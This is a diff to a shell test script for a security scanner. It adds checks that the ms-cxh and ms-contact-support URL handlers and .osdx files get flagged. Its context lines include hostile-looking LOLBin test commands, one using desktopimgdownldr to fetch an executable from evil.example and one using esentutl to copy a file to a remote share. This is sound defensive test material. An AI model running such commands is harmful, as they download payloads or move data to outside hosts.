@@ -11671,6 +11671,22 @@ check "url: cydia flagged" "$(./hlse_core 'cydia://evil' | head -1 | grep -c 'LO
     && check "secret FP guard: ssws prose clean" "0" "0" \
     || check "secret FP guard: ssws prose clean" "0" "1"
 
+# ── cycle-199: ms-cxh/ms-contact-support handlers + .osdx ────────
+for u in 'ms-cxh://x' 'ms-cxh-full://0' 'ms-contact-support://x'; do
+    ./hlse_core "$u" 2>&1 | grep -q "LOG" \
+        && check "url: ${u%%://*} flagged" "0" "0" \
+        || check "url: ${u%%://*} flagged" "0" "1"
+done
+XDIR199=$(mktemp -d /tmp/hlse199.XXXXXX)
+touch "$XDIR199/x.osdx"
+./hlse_core file "$XDIR199/x.osdx" 2>&1 | grep -q "LOG" \
+    && check "file: .osdx flagged" "0" "0" \
+    || check "file: .osdx flagged" "0" "1"
+rm -rf "$XDIR199"
+./hlse_core 'https://example.com' 2>&1 | head -1 | grep -q "OK" \
+    && check "url FP guard: https clean" "0" "0" \
+    || check "url FP guard: https clean" "0" "1"
+
 # ── cycle-198: paste LOLBin — esentutl/desktopimgdownldr/syncappv ─
 for c in 'esentutl /y c:\a.txt /d \\evil.example\s\a.txt' \
          'desktopimgdownldr /lockscreenurl:http://evil.example/x.exe /eventName:x' \
